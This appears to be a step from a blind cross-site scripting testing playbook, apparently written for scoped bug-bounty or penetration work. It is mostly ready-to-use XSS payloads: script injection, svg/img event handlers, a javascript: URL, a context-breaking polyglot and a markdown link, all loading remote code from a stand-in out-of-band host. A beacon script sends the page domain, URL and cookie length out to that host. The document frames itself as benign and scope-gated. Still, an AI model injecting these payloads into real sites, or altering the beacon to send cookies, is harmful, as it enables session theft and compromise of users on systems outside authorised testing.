# Blind XSS beacon payloads (step 3)
# You can't see the render, so the payload must PHONE HOME on execution, carrying enough context to
# prove JS ran and to attribute the fire. Token goes in the OOB hostname/path. BENIGN only.
# Record in injections.jsonl: {token, surface, field, payload, injected_at}.

## Core beacon — remote script that exfils minimal context
```html
"><script src=//TOKEN.oob.example></script>
```
`TOKEN.oob.example` serves JS that beacons back the fire context:
```js
// served by your OOB host for TOKEN:
new Image().src = '//TOKEN.oob.example/b?d=' + encodeURIComponent(
  document.domain + '|' + location.href + '|c' + document.cookie.length);
```
The HTTP beacon (not just the script DNS/GET) with `document.domain` proves JS executed in that
context — exactly what verify.md requires. `document.cookie.length` (a number) keeps it benign.

## Context-agnostic variants (unknown render context)
```html
"><svg/onload=import('//TOKEN.oob.example/m.js')>
"><img src=x onerror="import('//TOKEN.oob.example/m.js')">
javascript:import('//TOKEN.oob.example/m.js')
```
Polyglot (one payload, many contexts — confirm the real context from the beacon):
```
'"></textarea></title></style></script><svg/onload=import('//TOKEN.oob.example/m.js')>//
```

## Renderer-specific
- **PDF/doc engines:** some execute JS during generation — a `<script>`/`<img onerror>` in a field
  that lands in a generated PDF can fire server-side; beacon reveals it.
- **Email HTML:** JS mostly stripped; test anyway — a fire indicates a dangerous mail renderer.
- **Markdown surfaces:** `[x](javascript:import('//TOKEN.oob.example/m.js'))` / raw HTML passthrough.

## Notes
- Distinct token per injection = attribution (non-negotiable; verify.md rejects ambiguous callbacks).
- A DNS-only or plain-GET hit (no JS-derived data) is NOT proof of XSS — could be a URL parser, link
  preview, or AV. The beacon must carry something only running JS could produce.
- Everything is scope-gated + logged; record injected artifacts in cleanup.md for removal.
